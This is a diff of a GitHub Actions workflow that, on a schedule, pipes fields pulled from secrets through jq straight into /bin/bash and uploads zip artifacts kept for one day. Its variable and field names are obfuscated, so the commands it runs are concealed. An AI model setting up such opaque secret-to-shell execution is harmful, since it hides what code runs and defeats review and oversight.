@@ -1,23 +1,27 @@
 name: zhaihengchenfu
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '37 2/6 * * *'
 
-jobs:  # 5930
+  schedule:
+    - cron: '4 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhaihengchenfu
         env:
-          fmg48269: ${{ secrets.fmg48269 }}
+          tse3: ${{ secrets.tse3 }}
         run: |
-          echo $fmg48269 | jq -r .tf659 | /bin/bash
-          echo $ijwtq298 | jq -r .px78 | /bin/bash
-          echo $nqvgq14233 | jq -r .sjutf6 | /bin/bash
-          echo $jxvxg3551 | jq -r .r319 | /bin/bash
-          echo $cwx8452 | jq -r .yolho17 | /bin/bash
-          echo $dr482 | jq -r .trhug14 | /bin/bash
+          printf '%s' "$tse3" | jq -r .px18 | /bin/bash
+          echo $wy54013 | jq -r .kli09 | /bin/bash
+          echo $tqcjr3 | jq -r .uj6 | /bin/bash
+          printf '%s' "$i0043" | jq -r .xjr571 | /bin/bash
+          printf '%s' "$zcccr08642" | jq -r .xc35897 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vMuO9C7F
+          path: "*.zip"
+          retention-days: 1
